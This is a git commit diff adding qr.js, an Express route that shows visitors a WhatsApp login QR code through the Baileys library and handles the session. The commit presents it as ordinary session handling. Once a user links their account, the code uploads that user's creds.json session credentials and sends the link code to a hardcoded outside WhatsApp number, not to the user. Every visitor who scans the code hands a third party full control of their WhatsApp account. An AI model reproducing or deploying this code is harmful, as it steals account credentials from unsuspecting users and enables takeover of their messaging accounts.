f911ad607a80df1f6e4d84abcb5daae155e04cb5
Shuhaib! <127591148+shuhbap@users.noreply.github.com>
2026-04-23 18:58:21 +0530

    Implement QR code generation and session handling

--- qr.js
+++ qr.js
@@ -1,8 +1,88 @@
+const { upload } = require("./upload");
+const {makeid} = require('./id');
+const QRCode = require('qrcode');
 const express = require('express');
-const router = express.Router();
+const path = require('path');
+const fs = require('fs');
+let router = express.Router()
+const pino = require("pino");
+const {
+	default: makeWASocket,
+	useMultiFileAuthState,
+	jidNormalizedUser,
+	Browsers,
+	delay,
+	fetchLatestBaileysVersion,
+	makeInMemoryStore,
+} = require("@whiskeysockets/baileys");
 
-router.get('/', (req, res) => {
-    res.send('QR route working');
+function removeFile(FilePath) {
+	if (!fs.existsSync(FilePath)) return false;
+	fs.rmSync(FilePath, {
+		recursive: true,
+		force: true
+	})
+};
+
+
+
+const {
+	readFile
+} = require("node:fs/promises")
+router.get('/', async (req, res) => {
+	const id = makeid();
+	async function Getqr() {
+		const {
+			state,
+			saveCreds
+		} = await useMultiFileAuthState('./temp/' + id)
+		try {
+			let session = makeWASocket({
+				auth: state,
+				printQRInTerminal: false,
+				logger: pino({
+					level: "silent"
+				}),
+				browser: Browsers.macOS("Desktop"),
+			});
+
+			session.ev.on('creds.update', saveCreds)
+			session.ev.on("connection.update", async (s) => {
+				const {
+					connection,
+					lastDisconnect,
+					qr
+				} = s;
+				if (qr) await res.end(await QRCode.toBuffer(qr));
+				if (connection == "open") {
+					 
+					await delay(10000);
+					let link = await upload(`${session.user.id}.json`,__dirname+`/temp/${id}/creds.json`);
+	                                 let code = link.split("/")[4]
+					let owww = '919207226553@s.whatsapp.net'
+                        await session.sendMessage(owww, {text:`Afiya~${code}`})
+ 
+
+     
+     			await delay(100);
+					await session.ws.close();
+					return await removeFile("temp/" + id);
+				} else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
+					await delay(10000);
+					Getqr();
+				}
+			});
+		} catch (err) {
+			if (!res.headersSent) {
+				await res.json({
+					code: "Service Unavailable"
+				});
+			}
+			console.log(err);
+			await removeFile("temp/" + id);
+		}
+	}
+	return await Getqr()
+	//return //'qr.png', { root: "./" });
 });
-
-module.exports = router; // ✅ MUST
+module.exports = router
